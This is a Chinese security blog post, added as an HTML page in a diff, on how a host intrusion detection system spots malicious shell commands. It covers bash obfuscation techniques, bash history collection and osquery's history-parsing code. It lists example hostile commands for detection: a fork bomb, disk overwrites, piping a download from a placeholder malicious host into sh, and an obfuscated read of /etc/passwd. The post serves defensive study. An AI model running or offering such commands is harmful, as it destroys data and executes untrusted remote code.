@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        反入侵策略总结-恶意命令检测 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux命令混淆"><span class="toc-text">Linux命令混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#混淆方式"><span class="toc-text">混淆方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash-调试功能"><span class="toc-text">bash 调试功能</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#恶意命令"><span class="toc-text">恶意命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab命令检测"><span class="toc-text">crontab命令检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash命令检测"><span class="toc-text">bash命令检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过源码HOOK"><span class="toc-text">通过源码HOOK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#osquery检测逻辑"><span class="toc-text">osquery检测逻辑</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        反入侵策略总结-恶意命令检测
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-04-09 21:51:02</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#反入侵" title="反入侵">反入侵</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#命令混淆" title="命令混淆">命令混淆</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#history获取" title="history获取">history获取</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="Linux命令混淆"><a href="#Linux命令混淆" class="headerlink" title="Linux命令混淆"></a>Linux命令混淆</h1><p>Linux shell是脚本语言，有很多变种的执行方式。例如<code>cat /etc/passwd</code>就可以改成如下形式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cat $(echo /e)tc$(echo /pa*)wd</span></pre></td></tr></table></figure>
+
+<p>其他绕过方式可以查看参考链接</p>
+<h2 id="混淆方式"><a href="#混淆方式" class="headerlink" title="混淆方式"></a>混淆方式</h2><p>根据开源的命令<a href="https://github.com/Bashfuscator/Bashfuscator" target="_blank" rel="noopener">混淆器</a>，来总结下混淆的几种方式。</p>
+<p><strong>五种类型突变：</strong></p>
+<ol>
+<li>命令混淆<ul>
+<li>利用Linux环境中的命令或二进制文件行为的简单混淆器</li>
+<li>混淆整个输入在一个块中</li>
+</ul>
+</li>
+<li>字符混淆<ul>
+<li>使用更高级特性/二进制的模糊处理程序</li>
+<li>将输入分解成块，对这些块进行混淆，然后通过串联所有不同混淆块的标准输出来构建输入</li>
+</ul>
+</li>
+<li>token混淆<ul>
+<li>利用Bash功能或行为混淆命令</li>
+<li>通常不使用任何外部二进制文件</li>
+<li>混淆整个输入在一个块中</li>
+</ul>
+</li>
+<li>编码<ul>
+<li>对整个输入进行编码，并使用存根对其进行解码。</li>
+</ul>
+</li>
+<li>压缩<ul>
+<li>使用Linux环境中常见的各种压缩器，使用存根压缩并解压缩输入</li>
+</ul>
+</li>
+</ol>
+<p>使用<code>-l选项</code>可以列出所有的突变模块，并给出了大小和时间级别、描述等。</p>
+<p><strong>Command Obfuscators:</strong></p>
+<p>Name: Case Swapper</p>
+<p>Description: 相互转换所有大小写字符</p>
+<p>Name: Reverse</p>
+<p>Description: 反转一个命令</p>
+<p><strong>String Obfuscators:</strong></p>
+<p>Name: File Glob</p>
+<p>Description: 使用文件和glob排序重新组装字符串</p>
+<p>Name: Folder Glob</p>
+<p>Description: 使用文件和glob排序重新组装字符串</p>
+<p>Name: Hex Hash</p>
+<p>Description: 使用md5的输出对字符串进行编码</p>
+<p><strong>Token Obfuscators:</strong></p>
+<p>Name: ForCode</p>
+<p>Description: 打乱命令并在一个循环里恢复</p>
+<p>Name: Special Char Only</p>
+<p>Description: 将命令转换为只使用特殊字符</p>
+<p><strong>Encoders:</strong></p>
+<p>Name: Base64</p>
+<p>Description: Base64编码命令</p>
+<p>Name: RotN</p>
+<p>Description: 在ASCII字符集中将每个字符偏移随机次数</p>
+<p>Name: Xor Non Null</p>
+<p>Description: 使用perl中的xor运算符对字符串进行编码</p>
+<p><strong>Compressors:</strong></p>
+<p>Name: Bzip2</p>
+<p>Description: 使用bzip2压缩命令</p>
+<p>Name: Gzip</p>
+<p>Description: 使用gzip压缩命令</p>
+<h2 id="bash-调试功能"><a href="#bash-调试功能" class="headerlink" title="bash 调试功能"></a>bash 调试功能</h2><p>经常使用shell的，大家都应该知道 sh -x 这个命令，sh其实是bash的软连接，本质上还是调用的bash。sh -x可以打印出shell脚本的运行过程，这样就可以看到真正的执行命令，但是有一点不好，就是它真的会把命令执行起来。<strong>用它作为沙箱不合适，不仅浪费了检测的时间，还有可能被反调试</strong>。</p>
+<p>那我们的想法便是使用阉割版的bash，仅把命令打印出来但不执行。实现这一功能需要去修改源码后重新编译。可以参考：<a href="https://cloud.tencent.com/developer/article/1369290" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1369290</a></p>
+<h1 id="恶意命令"><a href="#恶意命令" class="headerlink" title="恶意命令"></a>恶意命令</h1><p>参考： <a href="https://techviral.net/dangerous-linux-commands/" target="_blank" rel="noopener">https://techviral.net/dangerous-linux-commands/</a></p>
+<ol>
+<li><code>:(){:|:&amp;};:</code></li>
+<li><code>[command] &gt; /dev/sda</code></li>
+<li><code>wget http://malicious.com -O | sh</code></li>
+<li><code>curl -s http://malicious.com</code></li>
+<li><code>dd if=something of=/dev/sda</code></li>
+<li><code>python -c &quot;[command]&quot;|perl -e &quot;[command]&quot;</code></li>
+</ol>
+<h2 id="crontab命令检测"><a href="#crontab命令检测" class="headerlink" title="crontab命令检测"></a>crontab命令检测</h2><p>这个信息在信息搜集模块搜集过，只要对每一条crontab匹配规则即可。</p>
+<h2 id="bash命令检测"><a href="#bash命令检测" class="headerlink" title="bash命令检测"></a>bash命令检测</h2><h3 id="通过源码HOOK"><a href="#通过源码HOOK" class="headerlink" title="通过源码HOOK"></a>通过源码HOOK</h3><p>之前也讲过可以使用history命令查看历史记录，但是很容易被绕过，并且搜集不完整。这边提供两种思路搜集命令：</p>
+<ol>
+<li>如果服务器是通过跳板机登录的，这个就好办了，跳板机会记录所有机器的操作命令，这样统一扫描就很方便。</li>
+<li>第一种情况在运维环境比较可能，线上环境并非都通过跳板机登录的。这种情况可以上面类似的思路，修改bash源码来进行记录。 具体参考<a href="https://blog.51cto.com/koumm/1763145，通过修改bash的源码，把执行的命令通过[syslog](https://www.thegeekdiary.com/linux-os-service-syslog/)发送给服务端" target="_blank" rel="noopener">https://blog.51cto.com/koumm/1763145，通过修改bash的源码，把执行的命令通过[syslog](https://www.thegeekdiary.com/linux-os-service-syslog/)发送给服务端</a> 。</li>
+</ol>
+<p>第二种情况也存在弊端，一是bash版本需要统一管理（母盘设置，初始化时其他系统继承母盘），二是linux中还存在其他<a href="https://www.jianshu.com/p/bc47aeb4f273" target="_blank" rel="noopener">shell</a>，需要也要hook源码，不然其他shell命令就无法记录了。</p>
+<h3 id="osquery检测逻辑"><a href="#osquery检测逻辑" class="headerlink" title="osquery检测逻辑"></a>osquery检测逻辑</h3><p>再看看知名开源hids框架[osquery](<a href="https://common.cnblogs.com/editor/tiny_mce/plugins/preview/" target="_blank" rel="noopener">https://common.cnblogs.com/editor/tiny_mce/plugins/preview/</a> <a href="https://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">https://www.freebuf.com/column/162604.html</a> )是怎么检测的（毕竟facebook官方开源的，很有借鉴意义）：</p>
+<p>遍历所有的用户，拿到<code>uid</code>，<code>gid</code>和<code>directory</code>。之后调用<code>genShellHistoryForUser()</code>获取用户的shell记录<code>genShellHistoryFromBashSessions()</code>和<code>genShellHistoryForUser()</code>作用类似。</p>
+<p><strong>genShellHistoryForUser()</strong>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">genShellHistoryForUser</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; uid, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; gid, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; directory, QueryData&amp; results)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">auto</span> dropper = DropPrivileges::<span class="built_in">get</span>();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!dropper-&gt;dropTo(uid, gid)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        VLOG(<span class="number">1</span>) &lt;&lt; <span class="string">"Cannot drop privileges to UID "</span> &lt;&lt; uid;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">return</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; hfile : kShellHistoryFiles) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        boost::filesystem::path history_file = directory;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        history_file /= hfile;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        genShellHistoryFromFile(uid, history_file, results);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p>可以看到在执行之前调用了:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> dropper = DropPrivileges::<span class="built_in">get</span>();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dropper-&gt;dropTo(uid, gid)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    VLOG(<span class="number">1</span>) &lt;&lt; <span class="string">"Cannot drop privileges to UID "</span> &lt;&lt; uid;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p>为什么对<code>gid</code>和<code>uid</code>降权， osquery一般都是使用root权限运行的，如果攻击者在<code>.bash_history</code>中注入了一段恶意的shellcode代码。那么当osquery读到了这个文件之后，攻击者就能够获取到root权限了，所以通过降权的方式就能够很好地避免这样的问题。</p>
+<p>之后遍历<code>kShellHistoryFiles</code>文件，执行<code>genShellHistoryFromFile()</code>代码。<code>kShellHistoryFiles</code>在之前已经定义，内容是：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; kShellHistoryFiles = &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="string">".bash_history"</span>, <span class="string">".zsh_history"</span>, <span class="string">".zhistory"</span>, <span class="string">".history"</span>, <span class="string">".sh_history"</span>,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr></table></figure>
+
+<p>可以发现其实在<code>kShellHistoryFiles</code>定义的就是常见的bash用于记录shell history目录的文件。最后调用<code>genShellHistoryFromFile()</code>读取<code>.history</code>文件，解析数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">genShellHistoryFromFile</span><span class="params">(<span class="keyword">const</span> std::string&amp; uid, <span class="keyword">const</span> boost::filesystem::path&amp; history_file, QueryData&amp; results)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    std::string history_content;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (forensicReadFile(history_file, history_content).ok()) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        auto bash_timestamp_rx = xp::sregex::compile(<span class="string">"^#(?P&lt;timestamp&gt;[0-9]+)$"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        auto zsh_timestamp_rx = xp::sregex::compile(<span class="string">"^: &#123;0,10&#125;(?P&lt;timestamp&gt;[0-9]&#123;1,11&#125;):[0-9]+;(?P&lt;command&gt;.*)$"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        std::string prev_bash_timestamp;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> auto&amp; line : split(history_content, <span class="string">"\n"</span>)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">            xp::smatch bash_timestamp_matches;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            xp::smatch zsh_timestamp_matches;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> (prev_bash_timestamp.empty() &amp;&amp;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                xp::regex_search(line, bash_timestamp_matches, bash_timestamp_rx)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">                prev_bash_timestamp = bash_timestamp_matches[<span class="string">"timestamp"</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">                <span class="keyword">continue</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            Row r;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> (!prev_bash_timestamp.empty()) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                r[<span class="string">"time"</span>] = INTEGER(prev_bash_timestamp);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">                r[<span class="string">"command"</span>] = line;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">                prev_bash_timestamp.clear();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (xp::regex_search(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">                    line, zsh_timestamp_matches, zsh_timestamp_rx)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">                std::string timestamp = zsh_timestamp_matches[<span class="string">"timestamp"</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">                r[<span class="string">"time"</span>] = INTEGER(timestamp);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">                r[<span class="string">"command"</span>] = zsh_timestamp_matches[<span class="string">"command"</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">            &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">                r[<span class="string">"time"</span>] = INTEGER(<span class="number">0</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">                r[<span class="string">"command"</span>] = line;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            r[<span class="string">"uid"</span>] = uid;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">            r[<span class="string">"history_file"</span>] = history_file.string();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">            results.push_back(r);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p>整个代码逻辑非常地清晰。</p>
+<ol>
+<li><code>forensicReadFile(history_file, history_content)</code>读取文件内容。</li>
+<li>定义<code>bash_timestamp_rx</code>和<code>zsh_timestamp_rx</code>的正则表达式，用于解析对应的<code>.history</code>文件的内容。 <code>for (const auto&amp; line : split(history_content, &quot;\n&quot;))</code>读取文件的每一行，分别利用<code>bash_timestamp_rx</code>和<code>zsh_timestamp_rx</code>解析每一行的内容。</li>
+<li><code>Row r;...;r[&quot;history_file&quot;] = history_file.string();results.push_back(r);</code>将解析之后的内容写入到Row中返回。</li>
+</ol>
+<p><code>genShellHistoryFromBashSessions()</code>获取历史命令的方法比较简单。</p>
+<ol>
+<li>获取到<code>.bash_sessions/*.history</code>所有的文件；</li>
+<li>同样调用<code>genShellHistoryFromFile(uid, history_file, results);</code>方法获取到历史命令；</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个检测项可能有多种的是实现方法，没有最好的方法，只有最适合的方法。选择哪种实现方式，还是要根据实际的情况来做衡量。</p>
+<p>单项检测可能无法做到尽善尽美，所以HIDS也是一种纵深检测的思路，后续介绍的命令执行检测的策略和bash历史命令检测相辅相成，相互补充。</p>
+<p><strong>参考：</strong></p>
+<p><a href="http://caffeinesecurity.blogspot.com/2011/09/guide-to-malicious-linuxunix-commands.html" target="_blank" rel="noopener">http://caffeinesecurity.blogspot.com/2011/09/guide-to-malicious-linuxunix-commands.html</a></p>
+<p><a href="https://techviral.net/dangerous-linux-commands/" target="_blank" rel="noopener">https://techviral.net/dangerous-linux-commands/</a></p>
+<p><a href="https://blog.spoock.com/2018/11/29/osquery-source-analysis-shell-history/" target="_blank" rel="noopener">https://blog.spoock.com/2018/11/29/osquery-source-analysis-shell-history/</a></p>
+<p><a href="https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/</a></p>
+<p><a href="https://www.smi1e.top/命令注入绕过姿势/" target="_blank" rel="noopener">https://www.smi1e.top/命令注入绕过姿势/</a></p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
